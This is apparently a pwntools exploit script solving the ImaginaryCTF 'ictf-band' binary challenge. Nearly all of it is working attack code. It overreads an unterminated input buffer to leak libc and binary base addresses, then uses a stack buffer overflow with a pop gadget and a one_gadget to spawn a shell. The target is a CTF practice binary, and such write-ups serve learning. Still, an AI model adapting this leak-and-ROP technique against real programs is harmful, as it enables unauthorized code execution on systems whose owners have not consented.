from pwn import *
import sys

#Cre: vilex1337

_path = "./ictf-band"
exe = ELF(_path)
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
add = 'ictf-band.chal.imaginaryctf.org'
port = 1337
cmd = '''
'''

_option = {'run' : process(_path), 
           }

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

def p(_data):
    return p64(_data, endian = 'little')

chall = conn()

def check():
    chall.interactive()
    exit()

def _leak(_num):
    chall.sendlineafter(b'>> ', b'1')
    chall.sendlineafter(b']:', b'0')
    chall.sendlineafter(b'Count: ', b'0')
    chall.sendlineafter(b']:', b'y')
    payload = b'a' * _num
    chall.sendlineafter(b'soon: ', str(_num).encode())
    chall.sendafter(b'e-mail: ', payload)
    chall.recvuntil(payload)
    ret = int.from_bytes(chall.recvuntil(b'\n')[:-1], 'little')
    chall.sendlineafter(b']: ', b'y')
    return ret
    

def main():
    #This challenge allow us to write but use a risky functions that it not put null bytes at the end of input.
    #It also contain bof.
    #My idea is use this to leak out libc address, then one_gadget through bof and get the shell.
    libc.address = _leak(8) - 0x231040
    print(hex(libc.address))
    _base = _leak(32) - 0x5060
    print(hex(_base))
    _pop_r12_r13 = libc.address + 0x41c48 
    _one_gadget = libc.address + 0xebce2
    
    chall.sendlineafter(b'>> ', b'4')
    chall.sendlineafter(b'Name: ', b'1337')
    payload = flat({0x157: p(_base + 0x5500) * 2}) + p(_pop_r12_r13) + p(0) * 2 + p(_one_gadget)
    chall.sendlineafter(b'Age: ', str(len(payload) + 1).encode())
    chall.sendlineafter(b'ground: ', payload)
    check()

if __name__ == "__main__":
    main()
